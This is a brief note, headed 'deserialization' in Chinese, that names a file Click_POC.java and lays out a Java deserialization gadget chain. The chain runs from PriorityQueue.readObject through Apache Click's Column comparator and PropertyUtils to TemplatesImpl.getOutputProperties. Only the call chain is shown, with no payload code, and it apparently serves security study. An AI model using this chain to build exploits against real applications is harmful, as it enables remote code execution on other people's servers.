## 反序列化

- Click_POC.java

  ```java
   * java.util.PriorityQueue.readObject()
   *       java.util.PriorityQueue.heapify()
   *         java.util.PriorityQueue.siftDown()
   *           java.util.PriorityQueue.siftDownUsingComparator()
   *             org.apache.click.control.Column$ColumnComparator.compare()
   *               org.apache.click.control.Column.getProperty()
   *                 org.apache.click.control.Column.getProperty()
   *                   org.apache.click.util.PropertyUtils.getValue()
   *                     org.apache.click.util.PropertyUtils.getObjectPropertyValue()
   *                       java.lang.reflect.Method.invoke()
   *                         com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
  ```

  